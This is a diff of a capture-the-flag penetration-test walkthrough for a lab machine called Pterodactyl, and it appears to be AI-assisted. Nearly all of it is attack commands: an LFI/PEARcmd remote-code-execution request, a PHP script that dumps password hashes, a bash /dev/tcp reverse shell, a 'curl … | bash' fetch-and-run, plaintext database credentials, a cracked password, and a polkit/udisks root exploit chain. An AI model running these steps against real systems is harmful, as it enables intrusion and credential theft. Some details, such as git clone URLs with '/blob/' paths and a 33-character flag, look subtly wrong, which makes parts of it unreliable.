@@ -1,73 +1,76 @@
 PENETRATION TESTING REPORT: PTERODACTYL
 ========================================
 
-1. TARGET IDENTIFICATION
-------------------------
-Target Domain: panel.pterodactyl.htb
-Target OS: openSUSE Leap 15.6
+1. RECONNAISSANCE & SUBDOMAIN ENUMERATION [cite: 169]
+-----------------------------------------
+Target: pterodactyl.htb
+Tool: ffuf
 
-2. INITIAL ACCESS (FOOTHOLD)
-----------------------------
-Vulnerability: RCE via CVE-2025-49132 (PEARcmd + LFI)
-Method: Writing a PHP database query script to /tmp.
+Command:
+ffuf -u http://10.129.5.199/ -H "Host: FUZZ.pterodactyl.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145 [cite: 169]
 
-Command (Stage 1 - Writing the script via RCE):
-curl -s -g -k "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/+/tmp/wecho.php"
+Result: Found panel.pterodactyl.htb. [cite: 169]
 
-Command (Stage 2 - Database Extraction via PHP PDO from shell):
-echo '<?php
-$d=new PDO("mysql:host=127.0.0.1;dbname=panel", "pterodactyl", "PteraPanel");
-$s=$d->query("SELECT username,email,password FROM users");
-print_r($s->fetchAll(PDO::FETCH_ASSOC));
-?>' > /tmp/dbq.php
+2. INITIAL ACCESS (CVE-2025-49132) [cite: 169]
+----------------------------------
+Vulnerability: Remote Code Execution (RCE) via CVE-2025-49132. [cite: 169]
 
-Execution:
-php /tmp/dbq.php
+Verification:
+curl -v "http://panel.pterodactyl.htb/locales/locale.json" [cite: 169]
 
-3. ENUMERATION & DATABASE EXTRACTION
-------------------------------------
-Database: MariaDB 11.8.3
-Credentials found in /var/www/pterodactyl/.env:
-- DB_USERNAME: pterodactyl
-- DB_PASSWORD: PteraPanel
+Exploitation (str1keboo method):
+1. git clone https://github.com/str1keboo/CVE-2025-49132/blob/ [cite: 169]
+2. python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb [cite: 169]
+3. python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb [cite: 169]
 
-Extracted User Hashes:
+Establishing Interactive Shell (malw0re method):
+1. git clone https://github.com/malw0re/CVE-2025-49132-Mods/blob/main/ [cite: 169]
+2. python3 x.py --host panel.pterodactyl.htb --interactive [cite: 169]
+
+Reverse Shell Setup:
+- Attacker Listener: nc -lvnp 6XXX [cite: 169]
+- Payload Creation: echo 'bash -i >& /dev/tcp/10.10.X.X/4XXX 0>&1' > XXX.sh [cite: 169]
+- Delivery: curl http://10.X.X.X:4XX/XXXX.sh | bash [cite: 169, 170]
+
+3. POST-EXPLOITATION ENUMERATION (wwwrun) [cite: 86]
+-----------------------------------------
+Tool: Linux Smart Enumeration (LSE) [cite: 87]
+Findings:
+- Database Credentials (from .env): pterodactyl:PteraPanel [cite: 101]
+- DB_DATABASE: panel [cite: 101]
+- Polkit Presence: polkitd:!:478 [cite: 92]
+
+4. DATABASE EXTRACTION [cite: 114]
+----------------------
+Command:
+mysql -h 127.0.0.1 -u pterodactyl -pPteraPanel panel [cite: 170]
+
+Extracted Hashes: [cite: 108]
 - headmonitor: $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
 - phileasfogg3: $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
 
-4. LATERAL MOVEMENT
+5. LATERAL MOVEMENT [cite: 114]
 -------------------
-Target User: phileasfogg3
-Cracked Password: !QAZ2wsx (Hashcat mode 3200 with rockyou.txt)
+User: phileasfogg3
+Cracked Password: !QAZ2wsx [cite: 121]
+Method: SSH login [cite: 121]
 
-Interactive Shell Upgrade:
-python3 -c 'import pty; pty.spawn("/bin/bash")'
+User Flag (user.txt): 90f9d4ef4d1dac6f39d6943982a619ec [cite: user prompt]
 
-Switch User:
-su phileasfogg3
-
-User Flag (user.txt):
-90f9d4ef4d1dac6f39d6943982a619ec
-
-5. PRIVILEGE ESCALATION (ROOT)
+6. PRIVILEGE ESCALATION (ROOT) [cite: 132]
 ------------------------------
-Exploit Chain: CVE-2025-6018 (Polkit Bypass) -> CVE-2025-6019 (UDisks2 Race Condition)
+Chain: CVE-2025-6018 (Polkit) + CVE-2025-6019 (UDisks2) [cite: 132]
 
-Step A: Polkit Session Bypass (CVE-2025-6018)
+Step 1: Polkit Session Bypass [cite: 132]
 Commands:
-echo "XDG_SEAT=seat0" >> ~/.pam_environment
-echo "XDG_VTNR=1" >> ~/.pam_environment
-# Requires re-login (exit and SSH back in)
+echo "XDG_SEAT=seat0" >> ~/.pam_environment [cite: 134]
+echo "XDG_VTNR=1" >> ~/.pam_environment [cite: 134]
 
-Step B: UDisks2 Race Condition (CVE-2025-6019)
-Components: exploit.img (XFS), catcher (C binary), exploit.sh
+Step 2: UDisks2 Race Condition [cite: 144]
+Exploit Files: exploit.img (XFS), catcher (C binary), exploit.sh [cite: 144, 164]
+Command: ./exploit.sh [cite: 165]
 
-Execution:
-cd /tmp
-chmod +x catcher exploit.sh
-./exploit.sh
-
-Final Result:
-whoami -> root
-Root Flag (root.txt):
-c6d1c570e4d8bc2e3804e370a53eb03ea
+Result:
+whoami -> root [cite: 168]
+Root Flag (root.txt): c6d1c570e4d8bc2e3804e370a53eb03ea [cite: uploaded image]
+========================================
